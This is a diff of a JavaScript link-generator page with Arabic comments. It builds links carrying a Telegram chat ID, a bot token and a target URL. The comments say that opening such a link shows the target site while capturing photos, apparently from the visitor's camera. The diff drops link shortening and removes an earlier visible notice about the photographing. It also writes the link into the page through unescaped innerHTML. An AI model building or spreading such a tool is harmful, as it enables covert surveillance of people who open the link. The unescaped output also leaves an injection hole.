@@ -83,7 +83,7 @@
 const generateBtn = document.getElementById("generateBtn");
 const result = document.getElementById("result");
 
-generateBtn.addEventListener("click", async () => {
+generateBtn.addEventListener("click", () => {
   const chatId = document.getElementById("chatIdInput").value.trim();
   const token = document.getElementById("tokenInput").value.trim();
   const link = document.getElementById("linkInput").value.trim();
@@ -95,19 +95,11 @@ generateBtn.addEventListener("click", async () => {
 
   // نضيف البيانات في الرابط
   const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chatId)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(link)}`;
-
-  // نستخدم API لاختصار الرابط (is.gd)
-  try {
-    const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(fullLink)}`);
-    if (!res.ok) throw new Error("فشل الاتصال بموقع is.gd");
-    const shortUrl = await res.text();
-    result.innerHTML = `<p>🔗 رابطك المختصر:</p><div>${shortUrl}</div>`;
-  } catch (e) {
-    result.textContent = "خطأ في الاختصار: " + e.message;
-  }
+  
+  result.innerHTML = `<p>🔗 رابطك:</p><div><a href="${fullLink}" target="_blank">${fullLink}</a></div>`;
 });
 
-// عند فتح الرابط المختصر → يعرض الموقع فقط + نص صغير أنه بيصور
+// عند فتح الرابط → يعرض الموقع + يلتقط صور
 const urlParams = new URLSearchParams(window.location.search);
 const openUrl = urlParams.get("url");
 if (openUrl) {
